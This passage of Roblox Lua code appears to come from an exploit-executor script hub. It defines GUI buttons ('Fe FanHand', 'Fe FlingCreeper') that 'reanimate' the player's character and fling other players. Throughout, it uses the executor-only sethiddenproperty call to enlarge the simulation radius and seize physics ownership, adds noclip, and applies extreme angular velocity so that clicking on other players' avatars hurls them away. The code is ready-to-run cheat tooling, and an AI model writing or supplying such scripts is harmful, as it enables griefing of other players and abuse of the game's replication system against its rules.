part.AlignPosition.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part.AlignPosition.MaxForce = 999999999*10 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false end  function nc(p) if p:IsA('BasePart') or p:IsA('Part') then te(ct,srv.Stepped:Connect(function() p.CanCollide=false end)) te(ct,srv.RenderStepped:Connect(function() p.CanCollide=false end)) else print('Cannot noclip '..p) end end  function af() for i,v in next, game.Players:GetDescendants() do if v:IsA('Player') and v.Name ~= game.Players.LocalPlayer.Name then for _,c in next, v.Character:GetDescendants() do if c:IsA('BasePart') and v.Parent== char then noo=Instance.new('NoCollisionConstraint',c) noo.Part1=char['Torso'] noo.Part0=c noo2=Instance.new('NoCollisionConstraint',c) noo2.Part1=char['Head'] noo2.Part0=c end end end end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then nc(v) end end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') and v.Name ~= 'Pal Hair' then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then nc(v) end end  for i,v in next, char:GetDescendants() do if v:IsA('Motor6D') and v.Name ~= 'Neck' then v:Destroy() end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') and v.Name ~= 'Right Leg' and v.Name ~= 'Head' and v.Parent == char then create(v,reanim[v.Name]) end end  function flinger(p) f=Instance.new('BodyAngularVelocity',p) f.P=9e9*10 f.AngularVelocity = Vector3.new(9e9*10,9e9*10,9e9*10) f.MaxTorque=Vector3.new(9e9*10,0,0) return f end  Pos(char['Right Leg'],reanim['Torso']) fliiiin=flinger(char['Right Leg'])  char['Pal Hair'].Handle:BreakJoints() char['Pal Hair'].Handle.Mesh:Destroy()  create(char['Pal Hair'].Handle,reanim['Right Leg'],Vector3.new(),Vector3.new(90,0,0))  reanim.Animate.Disabled=true  reanim.Parent=fl  sh=false  fp=Instance.new('Part',reanim) fp.Name='FlingPart' fp.CanCollide=false fp.Transparency=1 if clickfling then te(ct,m.Button1Down:Connect(function() sh=true end))  te(ct,m.Button1Up:Connect(function() sh=false end)) end te(ct,srv.Heartbeat:Connect(function() m.TargetFilter=char if sh then fp.CFrame=CFrame.new(m.Hit.p) char['Right Leg'].Position=fp.Position else fp.CFrame=char.Torso.CFrame*CFrame.new(0,0,0) char['Right Leg'].Position=fp.Position end end))  plr.Character=reanim workspace.Camera.CameraSubject=reanim  HumanDied=false  te(ct,reanim.Humanoid.Died:Connect(function() HumanDied=true fliiiin:Destroy() reanim.HumanoidRootPart.Anchored=true old=reanim.HumanoidRootPart.CFrame reanim.HumanoidRootPart.CFrame=old wait() reanim.HumanoidRootPart.CFrame=old char.Humanoid:Destroy() Instance.new('Humanoid',char) plr.Character=char char:BreakJoints() game.Players:Chat('-gr') for i,v in next, ct do v:Disconnect() end end))

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = game.Players.LocalPlayer.Character

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

-- for modes u can go in this link : https://Nexo.notxeneon15.repl.co/nexo/modes.lua

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if reanim.Humanoid.Jump then -- jump
--NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(28.51+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(-116.68+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(242.48+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-32.62+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-32.62+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2)
elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
--NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(-78.48+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(273.05+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-32.62+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-32.62+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 2 then -- idle
--NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-86.12+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(82+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(82+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
--NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(28.51+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(-116.68+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(242.48+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-32.62+30*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-32.62+-30*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
--run clerp here
end
srv.RenderStepped:Wait()
end
end)()
--Created using Nexo Animator V4 MADE BY REDMOON (IF YOU WANT SHOWCASE IT GIVE CREDITS)
end)

Section:NewButton("Fe FanHand(Need: Pal Hair & Fan Hand Sign)", "To Much", function()
clickfling = true -- set this to false if u dont want click fling or use torso fling

function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {} local te = table.insert local m = plr:GetMouse()  if char:FindFirstChild('Pal Hair') then else return end  _G.Jitter=Vector3.new(0,30,0)  for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") and v.Name ~= 'HumanoidRootPart' then  bf=Instance.new('BodyForce',v) bf.Force=Vector3.new(50,50,50) te(ct,game:GetService("RunService").Heartbeat:connect(function() pcall(function() v.Velocity = _G.Jitter v.BodyForce.Force=Vector3.new(50,50,50) game.Players.LocalPlayer.ReplicationFocus=workspace sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",9e9) end) end)) end end  char.Archivable = true fl=Instance.new('Folder',char) fl.Name = 'ArmFling' local reanim = char:Clone() char.Humanoid:ChangeState(16) char.HumanoidRootPart:Destroy()  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  hats=0 function create(part, parent, p, r) hats=hats+1 Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name..hats parent.Attachment.Name = part.Name..hats part.AlignPosition.Attachment0 = part[part.Name..hats] part.AlignOrientation.Attachment0 = part[part.Name..hats] part.AlignPosition.Attachment1 = parent[part.Name..hats] part.AlignOrientation.Attachment1 = parent[part.Name..hats] parent[part.Name..hats].Position = p or Vector3.new() part[part.Name..hats].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  function Pos(part, parent, p) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part.AlignPosition.MaxForce = 999999999*10 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false end  function nc(p) if p:IsA('BasePart') or p:IsA('Part') then te(ct,srv.Stepped:Connect(function() p.CanCollide=false end)) te(ct,srv.RenderStepped:Connect(function() p.CanCollide=false end)) else print('Cannot noclip '..p) end end  function af() for i,v in next, game.Players:GetDescendants() do if v:IsA('Player') and v.Name ~= game.Players.LocalPlayer.Name then for _,c in next, v.Character:GetDescendants() do if c:IsA('BasePart') and v.Parent== char then noo=Instance.new('NoCollisionConstraint',c) noo.Part1=char['Torso'] noo.Part0=c noo2=Instance.new('NoCollisionConstraint',c) noo2.Part1=char['Head'] noo2.Part0=c end end end end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then nc(v) end end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') and v.Name ~= 'Pal Hair' then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then nc(v) end end  for i,v in next, char:GetDescendants() do if v:IsA('Motor6D') and v.Name ~= 'Neck' then v:Destroy() end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') and v.Name ~= 'Right Leg' and v.Name ~= 'Head' and v.Parent == char then create(v,reanim[v.Name]) end end  function flinger(p) f=Instance.new('BodyAngularVelocity',p) f.P=9e9*10 f.AngularVelocity = Vector3.new(9e9*10,9e9*10,9e9*10) f.MaxTorque=Vector3.new(9e9*10,0,0) return f end  Pos(char['Right Leg'],reanim['Torso']) fliiiin=flinger(char['Right Leg'])  char['Pal Hair'].Handle:BreakJoints() char['Pal Hair'].Handle.Mesh:Destroy()  create(char['Pal Hair'].Handle,reanim['Right Leg'],Vector3.new(),Vector3.new(90,0,0))  reanim.Animate.Disabled=true  reanim.Parent=fl  sh=false  fp=Instance.new('Part',reanim) fp.Name='FlingPart' fp.CanCollide=false fp.Transparency=1 if clickfling then te(ct,m.Button1Down:Connect(function() sh=true end))  te(ct,m.Button1Up:Connect(function() sh=false end)) end te(ct,srv.Heartbeat:Connect(function() m.TargetFilter=char if sh then fp.CFrame=CFrame.new(m.Hit.p) char['Right Leg'].Position=fp.Position else fp.CFrame=char.Torso.CFrame*CFrame.new(0,0,0) char['Right Leg'].Position=fp.Position end end))  plr.Character=reanim workspace.Camera.CameraSubject=reanim  HumanDied=false  te(ct,reanim.Humanoid.Died:Connect(function() HumanDied=true fliiiin:Destroy() reanim.HumanoidRootPart.Anchored=true old=reanim.HumanoidRootPart.CFrame reanim.HumanoidRootPart.CFrame=old wait() reanim.HumanoidRootPart.CFrame=old char.Humanoid:Destroy() Instance.new('Humanoid',char) plr.Character=char char:BreakJoints() game.Players:Chat('-gr') for i,v in next, ct do v:Disconnect() end end))

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = game.Players.LocalPlayer.Character

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

-- for modes u can go in this link : https://Nexo.notxeneon15.repl.co/nexo/modes.lua

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if reanim.Humanoid.Jump then -- jump
--jump clerp here
elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
--fall clerp here
elseif Root.Velocity.Magnitude < 2 then -- idle
hat('WDW_FoamFinger','Left Arm',CFrame.new(0,0,0),CFrame.new(0+0*math["cos"](sine/10),-1.76+0*math["cos"](sine/10),0+0*math["cos"](sine/10))*CFrame.Angles(math.rad(-177.82+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),false)
--NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+5*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(158.42+10*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
hat('WDW_FoamFinger','Left Arm',CFrame.new(0,0,0),CFrame.new(0+0*math["cos"](sine/10),-1.76+0*math["cos"](sine/10),0+0*math["cos"](sine/10))*CFrame.Angles(math.rad(-177.82+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),false)
--NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-9.7+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(295.97+5*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-55.55+10*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+50*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-50*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
--run clerp here
end
srv.RenderStepped:Wait()
end
end)()
--Created using Nexo Animator V4 MADE BY REDMOON
end)

Section:NewButton("Fe FlingCreeper", "Minecraft lol", function()
function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

HumanDied = false for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") and v.Name ~= 'Torso' and v.Name ~= 'Head' then  _G.netless=game:GetService("RunService").Heartbeat:connect(function() v.AssemblyLinearVelocity = Vector3.new(-30,0,0) sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999) end) end end  local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {}  char.Archivable = true local reanim = char:Clone() reanim.Name = 'Nexo '..plr.Name..'' fl=Instance.new('Folder',char) fl.Name ='Nexo' reanim.Animate.Disabled=true char.HumanoidRootPart:Destroy() char.Humanoid:ChangeState(16)  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  function create(part, parent, p, r) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignOrientation.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] part.AlignOrientation.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part[part.Name].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 